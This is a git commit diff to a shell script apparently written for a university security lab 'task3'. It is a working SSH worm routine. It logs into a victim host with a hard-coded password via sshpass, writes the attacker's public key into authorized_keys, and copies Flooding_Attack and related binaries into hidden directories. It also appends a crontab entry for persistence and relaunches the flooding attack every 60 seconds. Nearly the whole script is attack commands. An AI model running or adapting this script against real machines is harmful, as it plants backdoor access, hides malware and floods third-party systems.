51c710fea5c092578e1fde4a4dfe3e1b0cfcd8a3
SongYun <william0228.cs05@g2.nctu.edu.tw>
2019-05-01 22:13:38 +0800

    debug

--- qq.sh
+++ qq.sh
@@ -1,8 +1,6 @@
 # task3
 # input victim's IP address
 export SSHPASS='victim'
-Hidden1="/home/victim/.etc/.qq"
-Hidden2="/home/victim/.Launch_Attack"
 
 read -p "Enter Victim IP Address: " IP_Address
 read -p "First?(y/n) " First
@@ -36,14 +34,15 @@ fi
 sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
 #####
 
-ssh victim@"$IP_Address" 'mkdir -p "$Hidden1"; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack "$Hidden1"; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack "$Hidden1"; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack "$Hidden1"; chmod 777 "$Hidden1";
-mkdir -p "$Hidden2"; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack "$Hidden2"; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack "$Hidden2"; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack "$Hidden2"; chmod 777 "$Hidden2";
-ssh victim@"$IP_Address"; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack'
-while [ 1 = 1 ]
+ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.qq"; mkdir -p $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1; chmod 777 $Hidden1 > /dev/null 2>&1'
+echo "qq1"
+ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; mkdir -p $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2; cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2; chmod 777 $Hidden2 > /dev/null 2>&1'
+echo "qq2"
+ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; echo "$(cat /home/victim/Desktop/ssh_worm/crontab.txt)" >> /etc/crontab; cd "$Hidden2" && ./Flooding_Attack > /dev/null 2>&1'
+while [ 1 ]
 do
-	ssh victim@"$IP_Address" 'cd "$Hidden2" && ./Flooding_Attack'
+	ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack"; cd "$Hidden2" && ./Flooding_Attack'
 	sleep 60
-	echo "winnie~~"
 done
 
 
